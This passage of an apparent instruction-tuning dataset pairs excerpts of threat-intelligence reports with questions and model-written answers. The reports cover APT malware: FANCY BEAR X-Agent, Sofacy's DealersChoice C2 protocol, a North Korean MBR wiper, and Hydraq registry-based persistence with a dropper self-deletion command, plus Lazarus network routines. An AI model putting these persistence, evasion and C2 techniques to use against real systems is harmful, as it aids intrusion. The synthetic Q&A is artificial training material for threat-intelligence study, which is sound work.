estimated to be higher in Sevastopol, most likely dues to the Russian Naval Base in the region. Source: The Razumkov Center report on \"The Ukranian Citizen's Identity in the New Environment: Status, Trends, Regional Differences,\"\"7 June 2016, razumkov.org.ua/upload/identi-2016.pdf.\n9-http://thesaker.is/ukrainian-army-losses-in-ato-anti-terrorist-operation-according-to-the-iisss-military-balance/\n10-For more information, see \"Origin of Artillery Attacks on Ukrainian Military Positions in Eastern Ukraine between 14 July 2014 and 8 August 2014, \"https://www.bellingcat.com/news/uk-and-europe/2015/02/17/ origin-of-artillery-attacks/.\"\nAnswer this question: How does the development and deployment of the X-Agent Android malware by FANCY BEAR align with the concept of full-spectrum combat as outlined by General Valery Gerasimov, and what implications does this have for future cybersecurity threats?",
    "output": "The development of the X-Agent Android malware by FANCY BEAR aligns with the concept of full-spectrum combat as envisioned by General Valery Gerasimov. This approach involves leveraging malware on the battlefield, in the civil sector, and against critical infrastructure, along with aggressive information operations in the media. The malware's ability to target mobile smartphone and tablet devices to gain strategic insight into communications is a tactic that highlights the integration of cyber capabilities into broader military operations. CrowdStrike assesses that this malware is likely just the initial iteration and could be deployed against non-military targets in the political, government, or non-governmental sectors in the near future. This underscores the need for robust cybersecurity measures across both military and civilian organizations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary capabilities of ActionRAT, and how does it utilize multiple C2 URLs in its operations?",
    "output": "ActionRAT has several primary capabilities, including gathering system information, executing arbitrary commands, listing drives, enumerating files, downloading and uploading files, and downloading and executing additional payloads. It typically uses two C2 URLs: one for the initial check-in to confirm infections (beacon C2 URL) and the other to instrument the RAT and send/receive commands and output data. This dual C2 URL approach allows ActionRAT to efficiently manage its communication and control over the infected endpoint.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Deal Me In: Finding Live C2 Servers\nIn our previous (<http://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/>)blog discussing DealersChoice, we identified the steps that Variant B would take once executed on a victim host, but were unable to successfully interact with the command and control (C2) server identified at the time.\nWe have since discovered two fully operational and active C2 servers (versiontask[.]com and postlkwarn[.]com) that followed the exact steps we outlined in the blog; loading the additional Flash exploit code into memory, following by loading the associated payload also into memory. Figure 1 details the workflow of victim to C2 communications.\nThe ActionScript within Variant B will interact with the C2 server, specifically to obtain a malicious SWF file and a payload. This process starts with an initial beacon to the C2 server that contains system information and the victim's Adobe Flash Player version. Figure 2 shows the beacon sent by the ActionScript to the C2 server.\nThe C2 responds to the initial beacon with strings that DealersChoice's ActionScript uses as variables in upcoming actions, such as additional HTTP requests and the decryption of the responses to those requests. Figure 3 shows the C2 server's response to the beacon, specifically including k1, k2, k3 and k4 values.\nThe ActionScript then uses the k1 variable from the C2 response data as a token within the HTTP request sent back to the C2 server to obtain the malicious SWF file, as seen in Figure 4.\nThe C2 server will respond to this request with data that the ActionScript will decrypt using the value of the k3 variable.\nThe active C2 servers provided Variant B with a malicious SWF file that was the same SWF file found within Variant A samples that exploited (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7645>)CVE-2015-7645 (addressed in October 2016 in Adobe Security Bulletin (<https://helpx.adobe.com/security/products/flash-player/apsa15-05.html>)APSA15-05).\nc42a0d50eac9399914090f1edc2bda9ac1079edff4528078549c824c4d023ff9 45a4a376cb7a36f8c7851713c7541cb7e347dafb08980509069a078d3bcb1405\nAfter receiving the malicious SWF file, Variant B will then issue an HTTP request using the k2 variable as a token to obtain its payload, as seen in Figure 5. The C2 will respond to this request with data that Variant B will decrypt using the value in the k4 variable as a key. The resulting decrypted data contains shellcode and a payload that the shellcode decrypts and executes.\nThe active C2 servers versiontask[.]com and postlkwarn[.]com provided shellcode that decrypts and executes a payload which in both cases was a loader Trojan that extracts and decrypts an embedded DLL that it saves to the system.\n5dd3066a8ee3ab5b380eb7781c85e4253683cd7e3eee1c29013a7a62cd9bef8c fa8b4f64bff799524f6059c3a4ed5d169e9e7ef730f946ac7ad8f173e8294ed8\nIn both cases, the DLL saved to the system is a variant of Sofacy's tool that uses the Carberp source code. 82213713cf442716eac3f8c95da8d631aab2072ba44b17dda86873e462e10421 3ff1332a84d615a242a454e5b29f08143b1a89ac9bd7bfaa55ba0c546db10e4b\nThe two variants of the Seduploader tool share a common C2 domain of apptaskserver[.]com, with differing backup C2 domains of appservicegroup[.]com and joshel[.]com.\nBig Headline: Ace in the Hole: Analyzing Victim Fingerprinting\nIn the process of analyzing Variant B's active C2 server, we wanted to test our hypothesis that the C2 server would load different exploit code dependent on victim fingerprinting. We tested this by providing different responses to the C2 server.\nFirst, we issued requests to the C2 server from a VPN located in California, USA and the server did not respond to the requests. We then connected to another VPN located in the Middle East and issued the same requests, at which point the C2 server responded with a malicious SWF and payload. This fact suggests that the Sofacy group uses geolocation to filter out requests that originate from locations that do not coincide with the location of their target.\nWe then issued several requests to test the C2 and each time the server responded with different k1, k2, k3 and k4 variables, suggesting that the server randomly chooses these values for each inbound request.\nTo further test the C2 server logic we created requests that contained different values for the operating system and Flash player version. When we sent the HTTP requests to the C2 server with the Adobe Flash Player version set to 23.0.0.185, the most recent Flash version vulnerable to CVE-2016-7855, the server responded with a compressed SWF file (SHA256: c993c1e10299162357196de33e4953ab9ab9e9359fa1aea00d92e97e7d8c5f2c) that exploited that very vulnerability.\nFinally, when we issued requests to the C2 server indicating the victim was a macOS system, the C2 server served the same malicious SWF file and Windows payload as before, suggesting that the Sofacy group is not using DealersChoice to check operating system type for its victims at this time.\nIn all cases the payload delivered by the C2 server is a loader Trojan (SHA256: 3bb47f37e16d09a7b9ba718d93cfe4d5ebbaecd254486d5192057c77c4a25363) that installs a variant of Seduploader (SHA256: 4cbb0e3601242732d3ea7c89b4c0fd1074fae4a6d20e5f3afc3bc153b6968d6e), which uses a C2 server of akamaisoftupdate[.]com.\nBig Headline: Show Your Hand: Decoy Documents\nSix documents were collected for this wave of DealersChoice attacks, all appearing to be Variant B, using similar lures to what we had observed in the previous wave. The six filenames we discovered were:\nOperation_in_Mosul.rtf \u2013 an article about Turkish troops in Mosul\nNASAMS.doc \u2013 a document that is a copy of an article regarding the purchase of a Norwegian missile defense system by the Lithuanian Ministry of National Defence\nProgramm_Details.doc \u2013 a document that is a copy of the schedule of a cyber threat intelligence conference in London, targeting a Ministry of Defense of a country in Europe\nDGI2017.doc \u2013 a document targeted at a Ministry of Foreign Affairs of a Central Asian country regarding the agenda for the Defence Geospatial Intelligence gathering in London\nOlympic-Agenda-2020-20-20-Recommendations.doc \u2013 a document containing details of agreements for the 2020 Olympics\nARM-NATO_ENGLISH_30_NOV_2016.doc \u2013 a document outlining an agreement between the Republic of Armenia and NATO\nUnlike the first DealersChoice attacks, these documents used stripped out or forged metadata in order to add in an additional layer of obfuscation. Two of the documents, NASAMS.doc and Programm_Details.doc shared a common, unique username pain in the Last Saved By field. Additionally, each of the weaponized documents continued to use the OfficeTestSideloading technique we had (<http://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/>)previously reported on. This was the technique we had discovered the Sofacy group began using over this past summer as a way to sideload DLL files using a performance test module built into the Microsoft Office suite as well as maintain persistence on the victim host.\nThe six first-stage C2 domains for the weaponized documents were all registered by unique registrant emails. Versiontask[.]com and Uniquecorpind[.]com appear to be completely new infrastructure, not sharing any artifacts with previously observed Sofacy group campaigns.\nSix second stage C2 domains for the Seduploader payloads delivered by DealersChoice were identified.\nMuch like the first stage C2 domains, the five non-sinkholed second stage C2 domains were registered recently and used unique registrant email addresses previously unused by the Sofacy group. However, each of these domains used nameservers commonly associated with the Sofacy group, ns*.carbon2u[.]com and ns*.ititch[.]com. The domain akamaisoftupdate[.]com revealed additional artifacts linking it back to previous Sofacy group campaigns. Based off passive DNS data, we discovered akamaisoftupdate[.]com resolving to 89.45.67.20. On the same class C\nsubnet, we discovered 89.45.67.189, which previously had resolved to updmanager[.]net, a well reported domain in use by the Sofacy group.\nThe domain securityprotectingcorp[.]com was also found to have links to previous Sofacy group infrastructure. It was registered a couple of months prior, but analysis of the registrant email address revealed that it had also been used to register microsoftsecurepolicy[.]org, which using passive DNS data we found had resolved to 40.112.210.240, a sinkhole with several other Sofacy group associated domains. Several of the corresponding sinkholed domains have been used over the years for multiple purposes by the Sofacy group, as C2s for multiple tools such as Azzy or XAgent, or to host phishing sites to gather credentials from targets.\n\nBased on the above text, answer a question. What techniques does the Sofacy group employ to obfuscate the metadata of weaponized documents in the DealersChoice attacks, and how do they maintain persistence on the victim host?",
    "output": "The Sofacy group employs several techniques to obfuscate the metadata of weaponized documents in the DealersChoice attacks. They strip out or forge metadata to add an additional layer of obfuscation. For example, two of the documents, NASAMS.doc and Programm_Details.doc, shared a common, unique username 'pain' in the 'Last Saved By' field. To maintain persistence on the victim host, the Sofacy group uses the OfficeTestSideloading technique, which involves sideloading DLL files using a performance test module built into the Microsoft Office suite. This technique allows the group to maintain persistence and execute malicious code on the victim's system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT35 leverage Scheduled Tasks to maintain persistence and execute malicious code in their attack campaign?",
    "output": "APT35 uses Scheduled Tasks to execute malicious code and maintain persistence on compromised systems. According to the given context, the threat actor creates a scheduled task using the schtasks.exe utility, which runs a batch script called Wininet.bat. This script loops through the execution of the file dllhost.exe, a golang binary that resolves domains and spawns commands to collect information about the compromised system. The scheduled task is created with the /Create and /F options, which allows the task to run under the context of the SYSTEM account. Additionally, the task is set to run at system startup, ensuring persistence even after a system reboot. By leveraging Scheduled Tasks, APT35 is able to execute malicious code in a way that is difficult to detect and remove.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: New Romantic Cyber Army Team / Hastati\nThe New Romantic Cyber Army Team also took credit for the March 20, 2013 attacks. McAfee suspected New Romantic Cyber Army Team were responsible for Operation Troy and the resulting March 20, 2013 attacks due to the group's \"frequent use of Roman and classical terms in their\ncode.\"374 It is unknown whether Hastati is an alternate name for the group or whether Hastati is an individual actor within the group.\n370 http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT\n371 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5\n372 http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT\n373 http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT\nIt is interesting to note that the malware associated with these actors uses the strings \"HASTATI\" and \"PRINCIPES\" to overwrite the MBR. The name Hastati likely refers to a class of infantrymen of the early Roman Republic. The Hastati were less experienced soldiers who fought on the frontlines with spears and swords. Principes likely refers to more experienced Roman soldiers who fought on the second line of battle. 375\nKnown tactics, techniques and procedures\n\uf0b7 Wiper malware\nTargets\n\uf0b7 KBS TV377\n\uf0b7 Entities targeted in Operation Troy378\nMedium Headline: Malware summary\nHP researchers had previously analyzed samples of the DarkSeoul dropper, and findings were published in our annual . Analysis of this malware is included in . Analysis of additional malware used in these campaigns produced no new findings and only corroborated what was found by external security researchers. These publicly available analyses have been cited throughout the report. Some of the malware samples were no longer publicly available. However, CrowdStrike obtained these missing samples before they disappeared from the wild and conducted thorough analysis, which was released in their subscription-only reports. While we cannot divulge detailed information from those reports, an overview of the findings is provided below.\n374 http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?\n375 http://www.roman-empire.net/army/army.html#earlylegion\n376 http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/\n377 http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/\n378 http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf\nThe majority of the malware used in cyber incidents attributed to North Korea were variations of three types of malware: dropper, wiper, and IRC remote access trojan (RAT). CrowdStrike's attribution of this malware to North Korean actors stemmed from two primary factors: Korean language characters found in the binaries and the propensity to specifically target South Korean entities.379\nDropper samples consistently targeted AhnLab Policy Center as a propagation method. This information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle Yang.380 CrowdStrike's report also briefly noted the use of an update server vector.381 Yang analyzed the malware's update config metadata and matched its format to the AhnLab Policy Center. To test its payload, Yang set up a server/client and executed the update through the server. As Yang had predicted, it wiped the client.382 While the method for initial compromise of the update server is not noted in detail, CrowdStrike's report cites \"collateral information\" that suggests targeted email attacks were used to gain initial entry, and policy servers were then compromised. The upload server vector included a time-based logic bomb that allowed the wiper to target a large number of systems, on a set time and date, with full permissions on all of the targeted systems.383\nAccording to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe. The wiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are the main processes for the Ahnlab and Hauri antivirus applications.384 385 The wiper then performed system reconnaissance, gathering drive information and operating system version. Depending on the OS used, the wiper recursively deleted files on the file system, deleting the Windows folder last. It then overwrote the MBR with the strings \"HASTATI\", \"PRINCPES\", \"PRINCIPES\", or \"PR!NCPES\".386\nWhile there are several variants of the wiper, all seem to have been used on the same date. It is unclear why multiple wiper variants with slightly differing behavior were used for the same campaign. One possible explanation is that multiple variants were used to minimize the operational damage to the mission in the case of an early detection of one of the variants. For example, if one wiper variant was compromised or detected by antivirus or IDS signatures, the other variants may have differed enough to remain undetected, still resulting in mission success.\nAccording to CrowdStrike, a third malware component downloaded an IRC RAT from various compromised websites. This RAT is detected by Symantec as Backdoor.Prioxer. Prioxer has been linked to other 2011 attacks on South Korea. It is unclear whether these downloaders were\npushed out in the same update server vector as the wipers. However, the two malware types both use the same packer 'Jokra' and both contain the strings \"HASTATI\" and \"PRINCPES\".387\n379 CrowdStrike Intelligence Report CSIR-13013\n380 Yang, Kyle. Z:\\Make Troy\\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.\n381 CrowdStrike Intelligence Report CSIR-13013\n382 Yang, Kyle. Z:\\Make Troy\\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.\n383 CrowdStrike Intelligence Report CSIR-13013\n384 CrowdStrike Intelligence Report CSIR-13030\n385 Yang, Kyle. Z:\\Make Troy\\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.\n386 CrowdStrike Intelligence Report CSIR-13030\n\nWhat tactics, techniques, and procedures (TTPs) were employed by the malware used in cyber incidents attributed to North Korea? How did the wiper malware function, and what steps did it take to execute its destructive actions?",
    "output": "The majority of the malware used in cyber incidents attributed to North Korea were variations of three types: dropper, wiper, and IRC remote access trojan (RAT). The wiper malware was dropped on systems as AgentBase.exe and used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are the main processes for the Ahnlab and Hauri antivirus applications. It then performed system reconnaissance, gathering drive information and operating system version. Depending on the OS, the wiper recursively deleted files on the file system, deleting the Windows folder last. Finally, it overwrote the MBR with the strings 'HASTATI', 'PRINCPES', 'PRINCIPES', or 'PR!NCPES'. The use of multiple wiper variants with slightly differing behavior may have been a strategy to minimize operational damage in case one variant was detected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: INDICTMENTS AND SANCTIONS: U.S. UNDERTAKES MEASURES TO CONFRONT CHINESE ECONOMIC ESPIONAGE\nIn 2014, the U.S. Government began taking punitive measures against China, from indicting members of the PLA to raising the possibility of sanctions. These unprecedented measures, though met with skepticism in the U.S., have probably been taken much more seriously in Beijing.\nIn May 2014, the U.S. Department of Justice indicted five PLA officers, marking the first time that the U.S. Government has charged foreign government personnel with crimes related to commercial cyber espionage.32 33 Although China warned that the move \"jeopardizes China-U.S. cooperation,\" the Department of Justice indicted another Chinese national, Su Bin, the following August for allegedly orchestrating a cyber-enabled economic\nespionage operation targeting U.S. defense companies.34 35 In 2015, President Obama authorized the sanctioning of individuals or entities involved in cyber activities that pose \"a significant threat to the national security, foreign policy, or economic health or financial stability of the United States.\"36 Later that year, news reports emerged claiming that the Obama administration had begun preparing a set of unprecedented economic sanctions against Chinese individuals and companies.37\n32  http://www.wsj.com/articles/SB10001424052702304422704579571604060696532\n33  http://www.nytimes.com/2014/05/20/us/us-to-charge-chinese-workers-with-cyberspying.html\n34  http://www.nytimes.com/2014/05/20/us/us-to-charge-chinese-workers-with-cyberspying.html\n35  https://www.fbi.gov/losangeles/press-releases/2014/los-angeles-grand-jury-indicts-chinese-national-in-computer-hacking-scheme-allegedly-involving-theft-of-trade-secrets\n36  https://www.whitehouse.gov/the-press-office/2015/04/01/executive-order-blocking-property-certain-persons-engaging-significant-m\n37  https://www.washingtonpost.com/world/national-security/administration-developing-sanctions-against-china-over-cyberespionage/2015/08/30/9b2910aa-480b-11e5-8ab4-c73967a143d3_story.html\nU.S. GOVERNMENT ACTIONS IN RESPONSE TO CHINA'S CONTINUED ECONOMIC ESPIONAGE\nExecutive Order\nMedium Headline: NETWORK COMPROMISES CONTINUE; MID-2014 DECLINE IN OVERALL ACTIVITY FROM SUSPECTED CHINA-BASED GROUPS\nWe examined the incidence of network compromises by suspected China-based actors dating back nearly three and a half years, to early 2013. Our data is based on our visibility, which includes a combination of sources (Mandiant Services engagements, FireEye as a Service, and FireEye's Dynamic Threat Intelligence data) that provide us with both a breadth and depth of coverage. While our visibility may vary from region to region depending on our customer base, we believe it provides a reasonable representation of Chinese cyber activity.\nAs shown in Active Network Compromises Conducted by 72 Suspected China-Based Groups by Month (in the following graph) a decline in activity began in mid-2014. During that time period we identified 262 network compromises (where a network compromise is defined as successful remote entry into a victim's network) conducted by 72 suspected China-based groups. Our data analysis reveals an overall decline in China-based intrusion activity against private and public sector organizations since mid-2014.\n\nBased on the above text, answer a question. What were the key punitive measures taken by the U.S. Government in 2014 and 2015 to confront Chinese economic espionage, and how did these actions potentially influence China's cyber operations?",
    "output": "In 2014, the U.S. Government took several punitive measures against China. In May 2014, the U.S. Department of Justice indicted five PLA officers for crimes related to commercial cyber espionage, marking the first time such charges were brought against foreign government personnel. Additionally, in August 2014, another Chinese national, Su Bin, was indicted for allegedly orchestrating a cyber-enabled economic espionage operation targeting U.S. defense companies. In 2015, President Obama authorized sanctions against individuals or entities involved in cyber activities posing a significant threat to U.S. national security, foreign policy, or economic health. These measures were likely taken seriously in Beijing and may have contributed to a decline in China-based intrusion activity against private and public sector organizations since mid-2014.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nThe discovery of Hydraq allowed us to explore and understand the underlying features of a highly sophisticated means of attack. It takes time, organization, skill, and resources to successfully deploy coordinated attacks against high profile infrastructures such as Google.\nClearly, the increasing wealth of information stored in the cloud2 (<>)is becoming an attractive target. The emerging world of cyberspace is now at war against cybercriminals and those conducting cy-berwarfare [7] [8]. Sophisticated attacks exploiting unknown software vulnerabilities as means of entry point provides an advantage for attackers to silently infiltrate and perform various forms of spying including the ability to deploy video and audio surveillance, and the probing and stealing of sensitive desired information. Hydraq's communication protocol is carefully crafted and researched making it difficult to detect and recognize an on-going attack over the network. The level of detail of the backdoor commands allow a remote attacker to perform the necessary tasks using a smaller resource footprint.\nIn conclusion, the emergence of this type of sophisticated offensive capability will continue to pose challenges for cyberspace security defenses. By exposing the intricate details of Hydraq, we hope to assist and contribute to overall cyber security learning and awareness.\n2 Cloud refers to services accessed and stored on the internet cloud. Take note, Google disclosed  that attackers accessed two Gmail accounts of Chinese human rights activist. [1]\nMedium Headline: Let the Technology Work For You\nHere are some easy steps and reminder to ensure that your CA security products provides optimal protection for you.\n1. Your security scanner must be always turned on and up-to-date with the latest signature. Real-time scanning protects you from possible infection that you may get from compromised Websites, network shares, email and flash drives.\n2. Turn on your firewall. Your firewall provides a different layer of security that guards you from network attacks and blocks unauthorized access to your machine. A firewall with real-time malware behavior intrusion detection could prevent or lessen the impact of malware infection.\n3. Turn on Data Execution Prevention (DEP). This feature is available in Windows XP SP3, Windows Server 2003, Windows Server 2008, Windows Vista and Windows 7. Refer Microsoft instruction on how to configure memory protection in Windows XP SP 2 at\n4. Increase your browser security settings. You can refer CERT Web browser security tips at\nMedium Headline: Be Security-Aware\n1. Do NOT open email from people you don't know. Think twice and verify before clicking a URL or open an attachment. Don't be click happy! All it takes is a moment of inattention.\n2. Implement strong password. Refer to these Microsoft Tips for creating a strong password:\n3. When conducting online banking or financial transaction, make sure your browser connection is secure.\n4. Encrypt online communication and confidential data.\n5. Back up your important data. Keep a copy of all your files and store them separately.\n6. Be cautious about instant messaging. Avoid chatting with people you don't know, especially if they ask for personal information such as photos or want you to do something for them.\n7. Protect your identity while enjoying online social networking activities. Be wary of clicking links or suspicious profiles. Double-check the integrity of the connection or friend request before adding anyone to your network. Avoid installing extras such as third-party applications; they may lead to malware infection, or attackers could use them to steal your identity.\n8. Avoid piracy by downloading from secure sources.\n9. Avoid threats that use social engineering techniques by checking user feedback about a Web site before visiting it, and reader feedback about an application before installing it.\n10. If you are using Adobe PDF Reader, prevent your default browser from automatically opening PDF document. Refer to our CA Security Advisor research blog entry at\n11. Check for and install security updates regularly.\n12. Be careful with search engine results. Read them carefully and check to ensure that the content relates to your subject before clicking the Web site link.\nBig Headline: Appendix A - Other variant method of installation\n1. Enumerates all services with the following characteristics:\n2. Searches for services with the SERVICE_RUNNING state or the service name Brower [sic].\na. The malware checks the service configuration for the following ImagePatch value: svchost.exe -k netsvcs\n(It searches for services with this value as a command line parameter)\nb. If the ImagePath value is found, it checks the registry key below and retrieves the value of ServiceDll registry entry:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<service name>\\Parameters\nc. The malware modifies the service's configuration, modifying the service Start and Type characteristics to the following:\nThese service modifications enable the service to start automatically, interact with the desktop, and run in its own process.\n3. If Step 2 is successful, the malware performs the following instructions:\na. Loads the resource file in memory and writes the resource's content to a file in \"%USER-PROFILE%\\<service name>.dll\".\nThis behavior drops the DLL component in the directory,\n\"%USERPROFILE%\\<service name>.dll\"\nNote: %USERPROFILE% is \"C:\\Documents and Settings\\<username>\".\nb. As part of its anti-forensic discovery, the malware modifies the DLL file time attributes to be the same as kernel32.dll.\nThe date created, last accessed, and last modified will be modified in this case.\nc. The Hydraq dropper modifies the registry key of the target service:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<service name>\\Parameters\\ServiceDll = \"%USERPROFILE%\\<service name>.dll\"\nThis automatically executes the DLL component on system start.\nd. The malware starts the target service to execute the DLL component.\n4. If Step 2 is NOT successful, the malware performs the following instructions:\na. Loads the malware's resource file in memory and writes the resource's content to a file in \"%USERPROFILE%\\<random name>.dll\".\nThis behavior drops the DLL component file in the directory \"%USERPROFILE%\\<random name>.dll\"\nNote:\n%USERPROFILE% is \"C:\\Documents and Settings\\<username>\".\n<random characters> is based on the result of GetTickCount API.\nb. The malware creates a service with the same name as the generated filename of the DLL component and with the following characteristics:\nDesiredAccess = SERVICE_ALL_ACCESS ServiceType = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS StartType = SERVICE_AUTO_START ErrorControl = SERVICE_ERROR_NORMAL BinaryPathName = \"%SystemRoot%\\System32\\svchost.exe -k \"random name\"\"\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Type = SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\Start = SERVICE_AUTO_START HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\ErrorControl = dword:00000001 HKLM\\SYSTEM\\CurrentControlSet\\Services\\<random name>\\ImagePath = %SystemRoot%\\System32\\svchost.exe -k \"<random name>\"\nIt also adds the service name in the registry key below so the service will be executed on start as a system service.\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\<random name> = <random name>\nc. The malware starts the created service to execute the DLL component.\nIf the malware fails to create the service it adds the following registry entry:\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\<random name> = rundll32.exe \"%USERPROFILE%\\<random name>.dll\", Launch\nIt then executes the process with the parameters below. If this fails the malware will delete the DLL component file.\nLastly the malware executes the file cmd.exe with the command line parameters below. The purpose of this is to delete the dropper component.\n\"%system%\\cmd.exe /c del \"<dropper filename>\" > nul\"\nBig Headline: Appendix D - Real-time Graphical Control\nThe Hydraq backdoor client can initiate real-time graphical control through the installation of Virtual Network Computing (VNC). Based on the malware code, the VNC DLL component can be installed in this sequence:\n1. Client sends Command 0x04 Task 0x08 to upload the file acelpvc.dll.\n2. Client initiates Command 0x07 Task 0x0B.\na. Get the file attributes of the file %System%\\acelpvc.dll,\ncheck if it is directory or file, exit if its a directory.\nb. Get address of acelpvc.dll's export function \"EntryMain\"\nc. Get the file attribute of the file %System%\\VedioDriver.dll,\ncheck if it is directory or file, exit if its a directory.\n3.1 If %System%\\VedioDriver.dll exists,\na. Load acelpvc.dll in the memory space of the malware.\nb. Execute acelpvc.dll's EntryMain export function with the server IP address and port as the parameter. The client is expected to have a VNC client to receive the frame-buffer [9] from the server.\n3.2 If %System%\\VedioDriver.dll does NOT exist,\na. Contact the client to download VedioDriver.dll\nb. The Server receives VedioDriver.dll from the client.\nc. Verify the CRC value of the created file from the server, and delete if it is different.\nd. Modify the file's date and time attributes to be the same as the system file, user32.dll.\n[Appendix D Figure 01 - Acelpvc.dll list of APIs used in the Import Table]\n[Appendix D Figure 02 - VedioDriver.dll Export Functions]\n\nQuestion: What are the steps involved in Hydraq's variant method of installation when it successfully finds a service with the specified characteristics?\n\nAnswer:",
    "output": "When Hydraq successfully finds a service with the specified characteristics, it performs the following steps: 1. Loads the resource file in memory and writes the resource's content to a file in '%USERPROFILE%\\\\<service name>.dll'. 2. Modifies the DLL file time attributes to match those of kernel32.dll as part of its anti-forensic measures. 3. Modifies the registry key of the target service to automatically execute the DLL component on system start. 4. Starts the target service to execute the DLL component.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 4.3.3  Network Functionality\nThe way a developer interacts with a network touch point can provide a fingerprint of the developer. When the developer builds a library for network interaction and uses the library in multiple malware families, analysts can easily identify related families based on the code reuse. The developer(s) of the Lazarus Group's malware routinely use network routines and techniques across multiple families within the Lazarus Group's malware collective. This section explores several of the more prominent techniques the developer(s) used in the Lazarus Group malware families.\nIf the elliptic _ curves extension is present, it is always followed by the ec _ point _ formats extension which defines a single format of uncompressed (0). The probability of either elliptical curve set being used is defined by the same random selection algorithm used when determining if the session _ id field will occur within the ClientHello.\nAfter the client side of the communication sends the ClientHello packet, the client expects the next data received from the server to be a ServerHello packet. If the data that arrives from the server is not a ServerHello, the connection terminates. The ServerHello response may or may not have a session _ id field, but the contents of this field are irrelevant to the client. The client will process the ServerHello packet only far enough to extract the selected cipher suite and then reads and disregards any incoming packets until the server sends the ServerHelloDone packet (up to 8 server packets).\nAfter receiving the ServerHelloDone packet, the connection between the client and the server is complete. Further communication is encapsulated in what appears to be a legitimate TLS frame. The header for every datagram transmitted between the client and server (and vice versa) consists of a 5-byte header that specifies the type of datagram (typically set to 22), the TLS version (set to 0x0301), and the number of bytes within the datagram. Following the TLS frame header, the payload bytes are transmitted. The payload contains the data encrypted using the Caracachs encryption scheme (see Section 6.1.1).\nMedium Headline: 4.3.3.2  C2 Connections\nSeveral of the malware families under the Lazarus Group umbrella use a common function for connecting to a C2 server. While most malware that uses the Winsock API will use socket and connect to open a socket between two end points, what makes the C2 server connection function identifiable is the method by which the authors generate and test the connection (Figure 6-11).\nThe authors perform the standard procedure of generating a virtual circuit between two end points by calling the socket API function to generate a socket object. Next the authors disable socket read blocking by calling ioctlsocket with the value 0x8004667E. The code then proceeds to call connect to establish a virtual circuit between the Trojan and the C2 server. In order to test the validity of the channel, the code will call select followed by _ WSAFDIsSet to determine if the Trojan can send data through the socket. If the socket is viable, read blocking is re-enabled via an ioctlsocket call, and the socket is returned to the caller of the function.\nMedium Headline: 4.3.3.3  Socket Disconnect\nMany of the RATs employed by the Lazarus Group have a unique method for closing active network socket connections. A typical solution to terminate a connection between two end points is to simply call the closesocket API function, which abruptly closes a socket channel. The authors responsible for the Lazarus Group's malware take a slightly more aggressive approach, however. The general form for disconnecting a socket employed by the Lazarus Group's malware consists of sending a WORD (2 byte) or DWORD (4 byte) value, usually equal to 0x0001 or 0x00000001, to the other receiving end of the socket followed by calling the shutdown API function which instructs the WinSock API to close both directions of communication. The final step in terminating a socket connection is the call to closesocket. There are slight variations on this method exist where setsockopt is called to allow for lingering sockets or where a different DWORD value is transmitted to the receiving end, but the basic pattern of send/shutdown/closesocket remains consistent. Below are several example variations.\nMedium Headline: 4.3.3.4  Common Network Data Transmission and Receiving Function\nThe Lazarus Group uses a common structure for transmitting and receiving data over the network. For network communication that uses encryption, the developer(s) of the Lazarus Group's malware abstracts the data shuttling functionality that takes the burden of managing the encryption component of the communication channel off of the core code. The use of such a design pattern, a pattern that has been observed used more and more as the code within the Lazarus Group's code has matured, indicates a level of attention to modularity in design.\nThe design pattern used for the transmission of data to a remote end point takes the form seen in Figure 6-13. The prototype for the transmission function is consistent across a larger number of the malware families, with the first parameter being the socket, the second and third parameters defining the location and size of the data to transmit, and the final argument being a flag to encrypt the transmission (if non-zero).\nThe exact encryption scheme used varies from family to family. Regardless, the overall pattern remains the same with very few exceptions across the entirety of the Lazarus Group's collection.\nThere are two main reciprocal functions for receiving data from the network as Figure 6-14 and Figure 6-15 illustrate. The design pattern for the receiving of potentially encrypted data consists of reading the data from the network until the specified number of bytes has been received (or a timeout occurs, in the case of RecvDataEx variants) and if the decrypt flag is set to non-zero, apply the family-specific decryption scheme 